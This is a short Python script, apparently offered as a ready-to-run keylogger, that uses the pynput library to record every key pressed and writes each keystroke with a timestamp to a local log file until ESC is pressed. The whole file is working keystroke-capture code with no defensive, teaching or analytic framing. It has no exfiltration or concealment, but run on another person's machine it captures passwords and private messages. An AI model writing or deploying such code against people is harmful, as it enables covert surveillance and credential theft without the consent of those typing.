from pynput import keyboard
import logging
from datetime import datetime

# Set up logging
current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = f"keylog_{current_time}.txt"

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if ESC key is pressed
        logging.info("Exiting keylogger.")
        return False

# Listen for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
